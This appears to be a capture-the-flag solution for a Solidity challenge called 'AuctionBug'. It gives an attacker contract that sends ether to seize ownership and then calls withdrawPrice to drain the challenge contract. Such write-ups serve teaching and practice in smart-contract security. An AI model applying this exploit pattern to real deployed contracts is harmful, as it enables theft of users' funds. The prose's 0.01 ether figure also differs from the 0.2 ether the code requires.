# AuctionBug

## Solution :

To validate this challenge, the user needs to become the contract's owner and call the `withdrawPrice()` function.

To become the owner, he needs to send at least `0.01 ether` to the contract.
For that, he needs to use the `send` method with the contract's address.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/intermediateChalls/AuctionBug.sol";

contract AttackAuctionBug {
	AuctionBug originalContract;

	constructor(address payable _originalContract) public {
		originalContract = AuctionBug(_originalContract);
	}

	function exploit() public payable {
		require(msg.value == 0.2 ether);
		address(originalContract).call.value(0.1 ether)(abi.encodeWithSignature("addToAuction()"));
		address(originalContract).call.value(0.1 ether)("");
		originalContract.withdrawPrice();
	}
}
```
